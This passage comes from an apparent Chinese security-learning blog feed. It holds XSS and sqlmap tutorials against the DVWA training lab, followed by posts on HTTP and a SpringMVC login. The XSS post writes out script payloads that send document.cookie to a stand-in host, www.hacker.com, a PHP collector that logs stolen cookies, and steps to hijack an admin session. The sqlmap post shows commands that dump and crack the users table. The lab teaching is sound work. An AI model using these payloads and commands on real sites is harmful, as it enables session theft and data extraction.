src="https://img-blog.csdnimg.cn/22444e6e72ee4ec290a919ab1f882904.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>可以看到页面出现弹窗，即我们输入的代码被程序成功解析，网站存在反射型XSS漏洞。</p><p>可能有人会说：这似乎并没有造成什么危害，不就是弹出一个框吗？那么请看下面这个例子。</p><p>假如网站 <a href="http://www.xxx.com/xss.php">www.XXX.com/xss.php</a> 存在XSS反射型漏洞，那么攻击者的步骤可能如下：</p><ol><li><p>用户 A 是网站 <a href="http://www.xxx.com/">www.XXX.com</a> 的忠实用户，此时正泡在论坛看信息。</p></li><li><p>攻击者发现 <a href="http://www.xxx.com/xss.php">www.XXX.com/xss.php</a> 存在反射型XSS漏洞，然后精心构造JS代码，此段代码可以盗取用户Cookie发送到指定的站点 <a href="http://www.hacker.com./">www.hacker.com。</a></p></li><li><p>攻击者将带有反射型XSS漏洞的URL通过站内私信发送给用户A，信的内容为一些诱惑信息，目的是为让用户A单击链接。</p></li><li><p>假设用户 A 点击了带有XSS漏洞的URL，那么将会把自己的Cookie 发送到网站<a href="http://www.xxx.com./">www.XXX.com。</a></p></li><li><p>攻击者接收到用户 A 的会话Cookie，可以直接利用Cookie 以 A 的身份登录<a href="http://www.xxx.org,从而获取用户/">www.XXX.org，从而获取用户</a> A 的敏感信息。</p></li></ol><p>以上步骤，通过使用反射型XSS漏洞可以以用户 A 的身份登录网站，这就是其危害，如果A的身份是管理员，那么危害将更加严重。</p><p>这是最简单的一种攻击，攻击者截获通过验证的用户会话令牌。劫持用户的会话后，攻击者就可以访问该用户经授权访问的所有数据和功能，其过程可以用一张图表示：<br><img src="https://img-blog.csdnimg.cn/ef3d12c10f874e82bb331d52be41c350.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h5 id="3-2、存储型XSS"><a href="#3-2、存储型XSS" class="headerlink" title="3.2、存储型XSS"></a>3.2、存储型XSS</h5><p>存储型XSS又被称为持久性XSS，是最危险的一种跨站脚本。允许用户存储数据的 Web 应用都可能会出现存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，然后不经过过滤或净化就显示给其他用户，这时候就会出现存储型XSS。</p><p>存储型与反射型、DOM型相比，具有更高的隐蔽性，危害性也更大。它们之间最大的区别在于：反射型XSS 与 DOM型XSS 执行都必须依靠用户手动去触发，而存储型XSS却不需要。</p><p>利用存储型XSS漏洞的攻击至少需要向 Web 应用提出两个请求。攻击者在第一个请求中构造JavaScript，应用程序接受并保存。在第二个请求中，一名受害者查看包含恶意代码的页面，这时JavaScript开始执行。</p><p>下面以 DVWA 的存储型XSS为例：</p><p>核心代码:</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = stripslashes( $message );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Sanitize name input    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );&#125;?&gt;</code></pre><p>在上面代码中，获取POST参数mtxMessage和txtName，然后将参数插入到数据库的表中，并显示到页面上。页面的功能是获取用户名字和内容并插入到数据库中，如果我们输入恶意代码，那么也会插入到数据库中，只要用户访问这个页面，那么恶意代码就会执行。</p><p>在页面提交以下数据<br><img src="https://img-blog.csdnimg.cn/3babd4c4dc1c4c5c8c70b1eadce98519.png"><br>可以看到数据成功存储到了数据库<br><img src="https://img-blog.csdnimg.cn/605b6c76cbe642e398585296251c0c44.png"><br>那么当其它用户访问这个页面时就会执行存储的JS代码。<br><img src="https://img-blog.csdnimg.cn/4046823d4efe48478e655a7001431e9b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>试想一下：如果攻击者构造的JS代码是把当前用户的Cookie发送给攻击者时，后果会有多严重？</p><h5 id="3-3、DOM型XSS"><a href="#3-3、DOM型XSS" class="headerlink" title="3.3、DOM型XSS"></a>3.3、DOM型XSS</h5><p>DOM XSS与反射型XSS、存储型XSS的主要区别在于DOM XSS的XSS代码不需要服务端的解析响应，触发XSS的是浏览器端（即客户端）的DOM解析。</p><p>DOM的全称：Document Object Model，即文档对象模型，DOM通常用于代表HTML、XHTML和XML中的对象。使用 DOM 可以允许程序和脚本动态地访问和更新文档的内容、结构和样式。根据DOM规定，HTML文档中的每个成分都是一个节点。</p><p>DOM的规定如下：</p><ul><li>整个文档是一个文档节点</li><li>每个HTML标签是一个元素节点</li><li>包含在HTML元素中的文本是文本节点</li><li>每一个HTML属性是一个属性节点</li><li>节点与节点之间都有层级关系</li></ul><p>这些节点按照层级关系组成了 DOM 的整体结构：节点树，如图所示：<br><img src="https://img-blog.csdnimg.cn/1010ca6d05b24e9b8ad8236a91b4e938.png"><br>在一个web页面中有许多组成页面的元素，当页面到达浏览器时，浏览器会为页面创建一个顶级的 Document  object 文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。通过JS脚本可以对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p><p>可能触发DOM型XSS的属性：</p><ul><li>document.referer属性</li><li>window.name属性</li><li>location属性</li><li>innerHTML属性</li><li>documen.write属性</li></ul><p>来看一个例子，代码如下：</p><pre><code class="html">&lt;html&gt;&lt;head&gt;    &lt;meta content=&quot;text/html;charset=utf-8&quot; /&gt;    &lt;title&gt;XSS DOM&lt;/title&gt;    &lt;script type=&quot;text/javascript&quot;&gt;            function replace() &#123;                    document.getElementById(&quot;id1&quot;).innerHTML =document.getElementById(&quot;dom_input&quot;).value;            &#125;    &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;    &lt;h6 id=&quot;id1&quot;&gt;这里显示输入的内容&lt;/h6&gt;    &lt;form action=&quot;#&quot; method=&quot;post&quot;&gt;           &lt;input type=&quot;text&quot; id=&quot;dom_input&quot; value=&quot;输入&quot;&gt;&lt;br /&gt;           &lt;input type=&quot;button&quot; value=&quot;替换&quot; onclick=&quot;replace()&quot;&gt;    &lt;/form&gt;    &lt;hr&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>程序存在JS函数replace()，该函数的作用是通过DOM操作将元素 id1 的内容修改为元素 dom_input 的内容。这个页面的功能是输入框中输入什么，上面得文字就会被替换成什么。</p><p>输入恶意代码 <code>&lt;img src=1 onerror=alert(1)&gt;</code>，单击替换按钮，页面出现弹框，说明我们的代码被浏览器成功解析，导致DOM XSS。<br><img src="https://img-blog.csdnimg.cn/215f084ad21f4be5a73e4a2266d663ce.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br><img src="https://img-blog.csdnimg.cn/1bea6ce743d7452088a2d7391acf5191.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h3 id="二、靶场实战"><a href="#二、靶场实战" class="headerlink" title="二、靶场实战"></a>二、靶场实战</h3><p>前面介绍了 XSS 简单原理与几种类型，接下来通过实例来演示：XSS盗取用户的Cookie。</p><h4 id="XSS实现盗取管理员Cookie并登录："><a href="#XSS实现盗取管理员Cookie并登录：" class="headerlink" title="XSS实现盗取管理员Cookie并登录："></a>XSS实现盗取管理员Cookie并登录：</h4><p>这里测试用的工具是DVWA，首先登陆DVWA，选择low模式（默认是impossible），</p><p>选择XSS(Reflected)，首先对页面测试，输入代码：</p><pre><code class="php">&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>界面出现弹窗，说明存在XSS跨站漏洞<br><img src="https://img-blog.csdnimg.cn/fb035a64fa62462c9755d1c5b049a8c7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>接下来在自己的网站目录下，创建一个如下的php文件：</p><p>getcookie.php：</p><pre><code class="php">&lt;?php$cookie = $_GET[&#39;cookie&#39;];          //以GET方式获取cookie$log = fopen(&quot;cookie.txt&quot;, &quot;a&quot;);fwrite($log, $cookie .&quot;\n&quot;);           //写入文件并保存fclose($log);?&gt;</code></pre><p>接下来在有XSS漏洞的地方，输入如下代码</p><pre><code class="php">&lt;script&gt;document.location=&#39;http://www.hacker.com:81/getcookie.php?cookie=&#39;+document.cookie;&lt;/script&gt;</code></pre><blockquote><p>注：在JavaScript 中<br>document.location 用于跳转页面<br>document.cookie 可以创建 、读取、及删除cookie。</p></blockquote><p>或</p><pre><code class="php">&lt;script&gt;var i=new Image; i.src=&quot;http://www.hacker.com:81/getcookie.php?cookie=&quot;+document.cookie;&lt;/script&gt;</code></pre><p><img src="https://img-blog.csdnimg.cn/5f6956fcc72248e78f98c6eed17a0d22.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>点击提交后，受攻击的用户的Cookie信息就会发送到攻击者的服务器并保存。<br><img src="https://img-blog.csdnimg.cn/c4d3638ea9fb48969d14c529c6f60846.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>可以看到Cookie信息成功发送到自己服务器里。</p><p>接着使用我们正常用户进行登录，DVWA 中内置了一些其他用户，这里使用用户：smithy 密码：password，进行登录并开启 burpsuite 抓包</p><p><img src="https://img-blog.csdnimg.cn/fbb1137ef38f436da43929b80cbf85b8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_18,color_FFFFFF,t_70,g_se,x_16"><br>在 burpsuit 放行第一个请求，即下面这个带用户名和密码的包<br><img src="https://img-blog.csdnimg.cn/90e72d05d8a240ccbb529c56e6127738.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>将存在 Cookie 信息的请求发送到 Repeater 进行重放攻击<br><img src="https://img-blog.csdnimg.cn/e84fb4661bf940f4af7876c04ffd1f1e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>替换用户 Cookie 信息，将现在的普通用户的 cookie 信息替换成前期抓到的 admin 用户的cookie 信息。<br><img src="https://img-blog.csdnimg.cn/11e2538f460b42909d0179f8e54a0036.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>成功以管理员账户登录！<br><img src="https://img-blog.csdnimg.cn/1bd2f2a9f3fc40eb8ce8cedbba859ed9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>点击 Show response in browser 在浏览器中打开<br><img src="https://img-blog.csdnimg.cn/f11471db97574ec8ba1f96db6866124f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>点击copy，在浏览器中打开<br><img src="https://img-blog.csdnimg.cn/8c760cecb32f4b4f997654559e2e70ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyq5a6M5oiQ55qE5q2Mfg==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>测试结束！</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA——Sqlmap练习</title>
      <link href="2021/12/16/DVWA%E2%80%94%E2%80%94Sqlmap%E7%BB%83%E4%B9%A0/"/>
      <url>2021/12/16/DVWA%E2%80%94%E2%80%94Sqlmap%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>在DVWA页面中选择 SQL Injection</p><p><img src="https://img-blog.csdnimg.cn/20201105173214418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>一、首先肯定是要判断是否有注入漏洞，在输入框输入1，返回</p><pre><code>ID: 1First name: adminSurname: admin</code></pre><p><img src="https://img-blog.csdnimg.cn/20201105174614243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>返回正常；</p><p>再次输入<code>1&#39;</code>，报错，返回</p><p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near  “ <code>1&#39;</code> “  at line 1</p><p><img src="https://img-blog.csdnimg.cn/20201105204730652.png#pic_center" alt="在这里插入图片描述"><br>此时可以断定有SQL注入漏洞且为单引号闭合的字符型注入，下面利用SQLMap进行注入攻击。</p><p>二、利用Sqlmap工具：</p><p>1、先进行基本的测试</p><pre><code class="python">python sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/index.php?id=1&amp;Submit=Submit&quot; </code></pre><p><code>-u</code> 参数表示url，指定连接目标</p><p>得到提示：</p><p><img src="https://img-blog.csdnimg.cn/2020110520533660.png#pic_center" alt="在这里插入图片描述"><br>Sqlmap 得到302重定向到 “ <a href="http://localhost/DVWA/login.php">http://localhost:80/DVWA/login.php</a> “。你想跟上吗？[y/n]</p><p>根据该提示，可以判断(302重定向)跳转至登录页面，看来需要带cookie，否则可能无法正常执行。</p><blockquote><p>解释：web应用需要登录的时候需要加 cookie参数</p></blockquote><p>不加则如下：</p><p><img src="https://img-blog.csdnimg.cn/20201105210027467.png#pic_center" alt="在这里插入图片描述"><br>F12打开控制台，在网络里得到Cookie信息。</p><pre><code class="java">PHPSESSID    &quot;lqumo7do6sle0vl4gi7b9qqd57&quot;security    &quot;low&quot;</code></pre><p><img src="https://img-blog.csdnimg.cn/20201105210545491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="M6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center)"><br>加上带cookie参数再次测试：</p><pre><code class="python">python sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;security=low&quot;</code></pre><p>得到：</p><pre><code class="sql">the back-end DBMS is MySQL //后台数据库管理系统：MySQLweb server operating system: Windows //Web服务武器操作系统：Windowsweb application technology: PHP 5.4.45, Apache 2.4.23 //Web应用技术： PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 //后台数据库：MySQL</code></pre><p><img src="https://img-blog.csdnimg.cn/20201105212241569.png#pic_center" alt="在这里插入图片描述"><br>发现sqlmap可以跑出数据来了，构造其他语句，继续查取数据。</p><p>2、列出数据库信息：</p><pre><code class="java">python sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;s ecurity=low&quot; --dbs</code></pre><p><code>--dbs</code> 表示列出目标有哪些数据库</p><p>得到8个mysql下数据库名：<br><img src="https://img-blog.csdnimg.cn/20201105214939645.png" alt="在这里插入图片描述"></p><p>3、获取当前的数据库：</p><pre><code class="python">python sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;security=low&quot; --current-db</code></pre><p>  <code>--current-db</code>得到当前使用的数据库</p><p><img src="https://img-blog.csdnimg.cn/20201105215718669.png#pic_center" alt="在这里插入图片描述"><br>得到：<code>current database: &#39;dvwa&#39;</code></p><p>即：当前数据库名为：dvwa</p><p>4、获取当前数据库下的表：</p><pre><code class="python">python sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;security=low&quot; --table -D &quot;dvwa&quot;</code></pre><p><code>--table -D &quot;xxx&quot;</code> ：得到xxx数据库下面的表<br><img src="https://img-blog.csdnimg.cn/20201105221313664.png" alt="在这里插入图片描述"><br>5、获取数据库dvwa下user表的字段：</p><pre><code class="python">python sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;security=low&quot; --columns -T &quot;users&quot; -D &quot;dvwa&quot;</code></pre><p><code>--columns -T &quot;&quot; -D &quot;&quot;</code> 得到数据库下面的表下面的列(columns)</p><p>得到：<br><img src="https://img-blog.csdnimg.cn/2020110522281247.png" alt="在这里插入图片描述"></p><p>6、获取user表里的字段值：</p><pre><code class="python">python sqlmap.py -u &quot;http://localhost/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;PHPSESSID=lqumo7do6sle0vl4gi7b9qqd57;security=low&quot; --dump -T users -D dvwa  </code></pre><p>过程中会出现的部分提示信息：</p><pre><code class="java">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N]您是否要将散列存储到临时文件中，以便最终使用其他工具进行进一步处理do you want to crack them via a dictionary-based attack? [Y/n/q]您是否想通过基于字典的攻击来破解它们？what dictionary do you want to use?用什么字典来破解？[1] default dictionary file &#39;C:\WangAn\Sqlmap\txt\wordlist.zip&#39; (press Enter)[2] custom dictionary file[3] file with list of dictionary files回车会直接使用第一个do you want to use common password suffixes? (slow!) [y/N]您是否要使用通用密码后缀？ （慢！）</code></pre><p>最终得到：<br><img src="https://img-blog.csdnimg.cn/2020110523301156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>至此，DVWA 的Low级别的SQL注入漏洞使用SqlMap工具注入完成。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> Sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP协议详解</title>
      <link href="2021/12/16/HTTP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/"/>
      <url>2021/12/16/HTTP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h4 id="一、HTTP概述："><a href="#一、HTTP概述：" class="headerlink" title="一、HTTP概述："></a>一、HTTP概述：</h4><p><strong>1、什么是HTTP协议</strong>：</p><ul><li>http 即超文本传输协议，是互联网上应用最广泛的一种网络协议。所有的www文件都必须遵循这个标准。设计http最初的目的是为了提供一种发布和接收HTML页面的方法，浏览器通过这一协议与服务器交互。</li></ul><p><strong>2、HTTPS</strong>：</p><ul><li>https是基于http，比http更加安全，提供了身份验证和通信内容加密。</li></ul><p><strong>3、1.0和1.1的区别</strong>: </p><ul><li>http1.0 通信基制，每次从浏览器向服务器发送请求，都需要建立一个新的Tcp连接。<br><img src="https://img-blog.csdnimg.cn/2020041313282845.png" alt="在这里插入图片描述"></li><li>http1.1建立一个Tcp连接，可以发送多个请求，服务器在作出多个响应后，最后关闭这个Tcp连接。<pre><code>![在这里插入图片描述](https://img-blog.csdnimg.cn/2020041313291582.png)</code></pre> <strong>4、HTTP消息</strong>：</li><li>http是基于请求和响应的，http消息包括请求头消息和响应消息。</li></ul><p>以这个简单的登录页面为例：<br><img src="https://img-blog.csdnimg.cn/2020041317394754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>bp抓包得到请求信息和响应相应信息。</p><p> <strong>5、请求信息</strong>：</p><pre><code class="php">GET /a/1.html?user=12345&amp;pwd=12345 HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeReferer: http://127.0.0.1/a/1.htmlUpgrade-Insecure-Requests: 1</code></pre><p><strong>6、响应信息</strong>:</p><pre><code class="php">HTTP/1.1 200 OKDate: Mon, 13 Apr 2020 09:24:00 GMTServer: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45Last-Modified: Mon, 13 Apr 2020 09:23:02 GMTETag: &quot;fa-5a328a13cd4a0&quot;Accept-Ranges: bytesContent-Length: 250Connection: closeContent-Type: text/html&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt; &lt;/head&gt;&lt;body&gt;&lt;form action=&quot;get&quot;&gt;用户名:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;密码:&lt;br&gt;&lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt; &lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="二、HTTP请求消息："><a href="#二、HTTP请求消息：" class="headerlink" title="二、HTTP请求消息："></a>二、HTTP请求消息：</h4><p>http请求信息包括：</p><p>1、请求行：</p><pre><code class="php">GET /a/1.html?user=12345&amp;pwd=12345 HTTP/1.1</code></pre><p>2、请求头信息：</p><pre><code class="php">Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeReferer: http://127.0.0.1/a/1.htmlUpgrade-Insecure-Requests: 1</code></pre><p>标识解释：</p><ul><li>Host ：请求资源主机的IP地址端口号（这里为80端口，默认不显示）。</li><li>Accept：指示客户机可以接收的媒体类型。</li><li>Referer：请求是从什么地方发起的。（可以用来防盗链）</li><li>Content-Type：指出发送给服务器的消息主体的媒体类型。</li><li>Accept-Encoding：客户机可以接收的内容编码类型，如”gzip”。</li></ul><p>3、请求正文：</p><p>请求正文是只有以<code>post</code>方式提交的表单才有，<code>get</code>方式的请求内容在请求行里且url地址栏里也会有请求内容。<br><img src="https://img-blog.csdnimg.cn/20200413210643655.png" alt="在这里插入图片描述"><br>如果上面的登陆页面是以<code>post</code>方式提交，则请求正文为：</p><pre><code class="php">user=12345&amp;pwd=12345</code></pre><h4 id="三、HTTP响应消息："><a href="#三、HTTP响应消息：" class="headerlink" title="三、HTTP响应消息："></a>三、HTTP响应消息：</h4><p>http响应信息包括：</p><p><strong>1、响应行信息</strong>：</p><pre><code class="php">HTTP/1.1 200 OK</code></pre><p>由三部分组成，依次为：协议和版本号（HTTP/1.1）、状态码（200）、对状态码的描述（ok为响应成功）。</p><p>常见的HTTP状态代码：<br><img src="https://img-blog.csdnimg.cn/2020041321343311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>补充：<br><img src="https://img-blog.csdnimg.cn/20200418183232286.png" alt="在这里插入图片描述"><br>2、响应头信息：</p><pre><code class="php">Date: Mon, 13 Apr 2020 09:24:00 GMTServer: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45Last-Modified: Mon, 13 Apr 2020 09:23:02 GMTETag: &quot;fa-5a328a13cd4a0&quot;Accept-Ranges: bytesContent-Length: 250Connection: closeContent-Type: text/html</code></pre><p>标识解释:</p><ul><li>Server： 使用的的服务器类型。</li></ul><p>3、响应正文信息：</p><pre><code class="php">&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt; &lt;/head&gt;&lt;body&gt;&lt;form action=&quot;get&quot;&gt;用户名:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;密码:&lt;br&gt;&lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt; &lt;/body&gt;&lt;/html&gt;</code></pre><p>🆗，HTTP协议的介绍大致就这么多。</p>]]></content>
      
      
      <categories>
          
          <category> 网络协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> http </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringMVC 实现注册登录</title>
      <link href="2021/12/16/SpringMVC%20%E5%AE%9E%E7%8E%B0%E6%B3%A8%E5%86%8C%E7%99%BB%E5%BD%95/"/>
      <url>2021/12/16/SpringMVC%20%E5%AE%9E%E7%8E%B0%E6%B3%A8%E5%86%8C%E7%99%BB%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>记录一下SpringMVC实现注册登录功能这个小程序。<hr></p><h4 id="一、新建动态Dynamic-Web-Project："><a href="#一、新建动态Dynamic-Web-Project：" class="headerlink" title="一、新建动态Dynamic Web Project："></a>一、新建动态Dynamic Web Project：</h4><ol><li>新建Dynamic Web Project，项目名为LoginSpringMVC</li><li>导入相应的JAR包：<br><img src="https://img-blog.csdnimg.cn/20201017162838161.png" alt="在这里插入图片描述"></li><li>项目整体结构：<br><img src="https://img-blog.csdnimg.cn/20201017163009117.png" alt="在这里插入图片描述"></li></ol><h4 id="二、配置web-xml："><a href="#二、配置web-xml：" class="headerlink" title="二、配置web.xml："></a>二、配置web.xml：</h4><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;    xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;    xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;    id=&quot;WebApp_ID&quot; version=&quot;4.0&quot;&gt;    &lt;display-name&gt;LoginSpringMVC&lt;/display-name&gt;    &lt;servlet&gt;        &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt;        &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;        &lt;init-param&gt;            